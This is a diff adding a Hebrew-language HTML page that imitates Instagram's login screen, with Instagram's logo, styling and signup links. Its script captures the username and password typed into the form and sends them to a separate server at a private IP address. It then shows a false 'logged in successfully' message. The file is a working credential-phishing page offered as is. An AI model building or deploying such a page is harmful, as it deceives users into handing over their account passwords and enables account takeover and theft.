@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="he">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>התחבר לאינסטגרם</title>
+    <style>
+        /* הגדרות כלליות */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            min-height: 100vh;
+        }
+        html, body {
+            height: 100%;
+            overflow: hidden; /* מבטל גלילה */
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100hv;
+        }
+
+        /* תיבת התחברות */
+        .login-box {
+            width: 350px;
+            border: 1px solid #dbdbdb;
+            background-color: #fff;
+            padding: 40px 30px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        /* לוגו */
+        .login-box .logo {
+            background-image: url("https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png");
+            background-position: center;
+            background-size: contain;
+            width: 250px;
+            height: 70px;
+            background-repeat: no-repeat;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        /* שדות קלט */
+        .login-box input[type="text"],
+        .login-box input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 14px;
+            outline: none;
+        }
+
+        /* כפתור התחברות */
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            border: none;
+            color: #fff;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .login-box button:hover {
+            background-color: #007ac1;
+        }
+
+        /* קו מפריד */
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #8e8e8e;
+            margin: 20px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+
+        .divider:not(:empty)::before {
+            margin-right: .25em;
+        }
+
+        .divider:not(:empty)::after {
+            margin-left: .25em;
+        }
+
+        /* לינק הרשמה */
+        .signup-box {
+            width: 350px;
+            border: 1px solid #dbdbdb;
+            background-color: #fff;
+            text-align: center;
+            padding: 15px 20px;
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .signup-box a, a {
+            color: #0095f6;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                margin-top: -50px; /* מעלה את הקונטיינר */
+            }
+        }
+
+    </style>
+</head>
+<body dir="rtl">
+    <div class="container">
+        <!-- תיבת התחברות -->
+        <div class="login-box">
+            <div class="logo"></div>
+            <form id="loginForm">
+                <input type="text" id="username" name="username" placeholder="שם משתמש" required>
+                <input type="password" id="password" name="password" placeholder="סיסמה" required>
+                <button type="submit">התחבר</button>
+            </form>
+            <div class="divider">או</div>
+            <a href="#">התחבר עם פייסבוק</a>
+        </div>
+
+        <!-- תיבת הרשמה -->
+        <div class="signup-box">
+            <p>אין לך חשבון? <a href="#">הירשם</a></p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+            
+            // שליחת הנתונים לשרת באמצעות בקשת POST
+            fetch("http://192.168.25.19:3000/login", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ username, password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert("התחברת בהצלחה!");
+            })
+            .catch(error => {
+                console.error("שגיאה:", error);
+            });
+        });
+    </script>
+</body>
+</html>
